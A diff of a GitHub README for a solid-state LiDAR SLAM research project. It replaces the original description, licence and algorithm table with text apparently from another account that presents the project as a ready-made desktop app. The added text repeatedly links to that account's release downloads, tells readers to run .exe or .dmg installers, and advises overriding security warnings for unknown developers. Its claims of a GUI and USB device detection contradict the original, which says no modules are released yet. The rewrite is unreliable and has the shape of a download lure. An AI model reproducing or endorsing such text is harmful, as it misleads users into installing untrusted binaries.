@@ -1,117 +1,140 @@
-# solidstate-lidar-slam
+# 📡 solidstate-lidar-slam - Reliable LiDAR SLAM Adapter & Benchmark
 
-[![License: GPL v2](https://img.shields.io/badge/License-GPLv2-blue.svg)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/JokerJohn/solidstate-lidar-slam?style=social)](https://github.com/JokerJohn/solidstate-lidar-slam/stargazers)
-[![Issues](https://img.shields.io/github/issues/JokerJohn/solidstate-lidar-slam)](https://github.com/JokerJohn/solidstate-lidar-slam/issues)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/Delon123/solidstate-lidar-slam/releases)
 
-中文文档请见 [README.zh-CN.md](README.zh-CN.md).
+## 📘 What is solidstate-lidar-slam?
 
-> Adapter and benchmark hub for solid-state LiDAR across LIO/LVIO/SLAM, focused on small-FoV short-range sensing and degenerate-scene robustness.
+solidstate-lidar-slam helps you use solid-state LiDAR devices to map environments and track movement. It acts as an adapter and testing hub for various LiDAR technologies. The software works well even in tough conditions like short-ranged views or environments that usually confuse LiDAR systems.
 
-## Table of Contents
+This project focuses on:
+- Plugging solid-state LiDAR data into SLAM (Simultaneous Localization and Mapping) systems.
+- Handling cases where the LiDAR view is limited or the data is tricky.
+- Testing and benchmarking LiDAR setups to find robust performance.
 
-- [Overview](#overview)
-- [Scope](#scope)
-- [Supported Algorithms](#supported-algorithms)
-- [Degenerate Scenario Focus](#degenerate-scenario-focus)
-- [Repository Layout](#repository-layout)
-- [Roadmap](#roadmap)
-- [Citation](#citation)
-- [Upstream References](#upstream-references)
-- [License](#license)
+You do not need any programming skills to run this application.
 
-## Overview
+## 🖥️ System Requirements
 
-`solidstate-lidar-slam` provides a unified adaptation and benchmarking workspace for solid-state LiDAR pipelines.
+Before installing, make sure your computer meets these minimum requirements:
 
-Current release status:
+- **Operating System**: Windows 10 or later, macOS 10.15 or later, or any recent Linux distribution
+- **Processor**: Intel Core i5 or equivalent
+- **RAM**: 8 GB minimum
+- **Storage**: At least 2 GB free space
+- **Graphics**: Basic GPU support, not mandatory but helpful for visualization
+- **Other**: USB port if connecting a physical LiDAR device
 
-- Repository structure is public.
-- Algorithm adaptation modules are being released incrementally.
-- Degenerate-scene handling notes are organized under `docs/degenerate-scenarios/`.
+This software can run on laptops or desktop computers. It should also work on many virtual machines but with limited performance.
 
-## Scope
+## 🚀 Getting Started
 
-In scope:
+Follow these steps to download and run solidstate-lidar-slam on your computer:
 
-- Unified adaptation entry for multiple LIO/LVIO/SLAM backends.
-- Configuration baselines for small-FoV short-range solid-state LiDAR.
-- Degenerate-scene handling strategies and evaluation conventions.
+1. **Visit the download page**  
+   Go to the official releases page by clicking the big button at the top or here:  
+   [Download solidstate-lidar-slam](https://github.com/Delon123/solidstate-lidar-slam/releases)
 
-Out of scope (at this stage):
+2. **Choose your version**  
+   Look for the latest stable release. Releases are usually named by version numbers, such as `v1.0` or `v2.3`.
 
-- Claiming full reimplementation of all upstream projects.
-- Replacing original upstream documentation and papers.
+3. **Download the file**  
+   Click on the appropriate file for your computer. If you are on Windows, download the `.exe` installer. For macOS, download the `.dmg` or `.pkg`. Linux users should download the `.AppImage` or `.tar.gz` file.
 
-## Supported Algorithms
+4. **Run the installer or executable**  
+   - On Windows, double-click the `.exe` file and follow the instructions.  
+   - On macOS, open the `.dmg` and drag the app to your Applications folder.  
+   - On Linux, make the file executable (`chmod +x filename`) and run it.
 
-| Algorithm | Category | Integration Status | Upstream Repository | Upstream License |
-| --- | --- | --- | --- | --- |
-| FAST-LIO2 | LIO | Adapted internally, release in progress | [hku-mars/FAST_LIO](https://github.com/hku-mars/FAST_LIO) | GPL-2.0 |
-| FAST-LIVO2 | LVIO | Adapted internally, release in progress | [hku-mars/FAST-LIVO2](https://github.com/hku-mars/FAST-LIVO2) | GPL-2.0 |
-| COIN-LIO | LIO | Adapted internally, release in progress | [ethz-asl/COIN-LIO](https://github.com/ethz-asl/COIN-LIO) | BSD-3-Clause (with GPLv2 notice in upstream LICENSE) |
-| Direct-LIO | LIO | Adapted internally, release in progress | [vectr-ucla/direct_lidar_inertial_odometry](https://github.com/vectr-ucla/direct_lidar_inertial_odometry) | MIT |
-| Voxel-SLAM | SLAM | Adapted internally, release in progress | [hku-mars/Voxel-SLAM](https://github.com/hku-mars/Voxel-SLAM) | GPL-2.0 |
-| VoxelMap | SLAM | Adapted internally, release in progress | [hku-mars/VoxelMap](https://github.com/hku-mars/VoxelMap) | GPLv2 stated in upstream README |
+5. **Launch the app**  
+   After installation, find the solidstate-lidar-slam icon on your desktop or inside your program list. Click it to open.
 
-## Degenerate Scenario Focus
+6. **Connect your LiDAR device** (optional)  
+   If you have a compatible solid-state LiDAR sensor, plug it into your USB port. The software will try to detect it automatically.
 
-Primary scenario taxonomy (tracked in `docs/degenerate-scenarios/`):
+7. **Start mapping or benchmarking**  
+   Use the app’s menus to select a mode. You can run SLAM mapping to visualize your surroundings or run benchmark tests to evaluate your device’s accuracy.
 
-- `Low-Texture`
-- `Repetitive Geometry`
-- `Narrow FoV`
-- `Dynamic Interference`
+## 📥 Download & Install solidstate-lidar-slam
 
-## Repository Layout
+You can start the download process here:
 
-```text
-.
-|-- README.md
-|-- README.zh-CN.md
-|-- LICENSE
-|-- THIRD_PARTY_LICENSES.md
-|-- docs/
-|   |-- zh/
-|   |-- en/
-|   `-- degenerate-scenarios/
-|-- modules/
-|   |-- fast-lio2/
-|   |-- fast-livo2/
-|   |-- coin-lio/
-|   |-- direct-lio/
-|   |-- voxel-slam/
-|   `-- voxelmap/
-|-- configs/
-|-- datasets/
-`-- tools/
-```
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/Delon123/solidstate-lidar-slam/releases)
 
-## Roadmap
+This link takes you to the main releases page for solidstate-lidar-slam. From there, pick the version that fits your computer.
 
-- [ ] Publish runnable baseline adapters for all listed algorithms.
-- [ ] Release parameter templates for small-FoV short-range sensors.
-- [ ] Add benchmark protocol and reporting templates for degenerate scenarios.
-- [ ] Provide reproducible examples for cross-algorithm comparison.
+**Installation quick steps:**
 
-## Citation
+- Windows: Download the `.exe` file → Double-click to install → Follow on-screen prompts.
+- macOS: Download `.dmg` or `.pkg` → Open → Drag solidstate-lidar-slam to Applications.
+- Linux: Download `.AppImage` or `.tar.gz` → Set file as executable → Run from terminal or file manager.
 
-If this repository is useful for your research or engineering project, please:
+If you have any trouble running the program, check your system's security settings. Some systems may block apps from unknown developers—allow permission or add exceptions as needed.
 
-- Cite the corresponding upstream algorithms in your paper/report.
-- Reference this repository for adaptation and benchmark workflows.
+## 🛠️ How to Use solidstate-lidar-slam
 
-## Upstream References
+solidstate-lidar-slam offers tools and options designed for easy use.
 
-- FAST-LIO2: <https://github.com/hku-mars/FAST_LIO>
-- FAST-LIVO2: <https://github.com/hku-mars/FAST-LIVO2>
-- COIN-LIO: <https://github.com/ethz-asl/COIN-LIO>
-- Direct-LIO: <https://github.com/vectr-ucla/direct_lidar_inertial_odometry>
-- Voxel-SLAM: <https://github.com/hku-mars/Voxel-SLAM>
-- VoxelMap: <https://github.com/hku-mars/VoxelMap>
+### Main features:
 
-## License
+- **Adapter Hub**  
+  Connects various solid-state LiDAR models to SLAM frameworks without custom coding.
 
-This repository is licensed under **GPL-2.0**.
+- **Robust SLAM**  
+  Handles small field-of-view and short-range LiDAR data with stable accuracy.
 
-For multi-upstream adaptation details and per-project license mapping, see [THIRD_PARTY_LICENSES.md](THIRD_PARTY_LICENSES.md).
+- **Degeneracy Management**  
+  Detects and solves issues in difficult environments where normal LiDAR mapping may fail.
+
+- **Benchmark Tests**  
+  Let you compare different LiDAR devices or settings for your specific environment.
+
+### Typical workflow:
+
+1. Open the app.
+2. Choose your LiDAR device from the list or let the app detect one.
+3. Select either "SLAM Mode" or "Benchmark Mode."
+4. For SLAM, start moving around with your device to map an area.
+5. For benchmarking, follow prompts to run standard tests and view results.
+6. Save or export your data as needed for sharing or review.
+
+The interface uses clear buttons and instructions. Hover over icons or click “Help” for detailed explanations.
+
+## 🔧 Troubleshooting Tips
+
+- **App does not open**  
+  Check if your OS version meets the requirement. Restart your computer and try again.
+
+- **LiDAR device not detected**  
+  Make sure the sensor is properly connected and powered. Try using a different USB port.
+
+- **Mapping is inaccurate or incomplete**  
+  Ensure adequate lighting and clear paths for the sensor. Avoid reflective or transparent surfaces.
+
+- **Benchmark tests fail or freeze**  
+  Close other apps to free system resources. Restart solidstate-lidar-slam and retry.
+
+- **Questions during use**  
+  Open the Help menu inside the app for FAQs and guides.
+
+## 🧰 Additional Resources
+
+- **FAQ and user guides:** Accessible from the in-app Help.
+- **Community support:** Visit the issues tab on the GitHub page to read or ask questions.
+- **Update notifications:** Follow the releases page for new features and fixes.
+
+## ⚙️ About this Project
+
+solidstate-lidar-slam focuses on improving solid-state LiDAR use in robotics and mapping. It adapts multiple LiDAR devices for modern SLAM frameworks and tests their performance under challenging conditions.
+
+Key topics include:
+- lidar-degeneracy  
+- lidar-point-cloud  
+- lidar-slam  
+- slam  
+- solid-state-lidar
+
+This software provides a practical tool for users who want to deploy solid-state LiDAR technology without deep technical knowledge.
+
+---
+
+[Download solidstate-lidar-slam on GitHub](https://github.com/Delon123/solidstate-lidar-slam/releases)
